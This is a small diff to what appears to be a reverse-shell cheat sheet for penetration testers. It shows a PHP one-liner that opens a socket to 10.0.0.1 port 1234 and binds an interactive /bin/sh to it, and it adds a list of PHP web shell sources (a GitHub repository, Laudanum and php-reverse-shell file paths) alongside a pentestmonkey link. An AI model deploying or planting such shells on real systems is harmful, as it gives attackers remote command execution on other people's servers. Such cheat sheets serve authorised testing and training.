@@ -48,6 +48,10 @@ This code assumes that the TCP connection uses file descriptor 3.  This worked 
 php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
 ````
 
+PHP webshells:
+https://github.com/heiswayi/simple-php-shell
+/usr/share/SecLists/Web-Shells/laudanum-0.8/php/shell.php
+usr/share/webshells/php/php-reverse-shell.php
 If you want a .php file to upload, see the more featureful and robust [php-reverse-shell](http://pentestmonkey.net/tools/web-shells/php-reverse-shell).
 
 ### Ruby
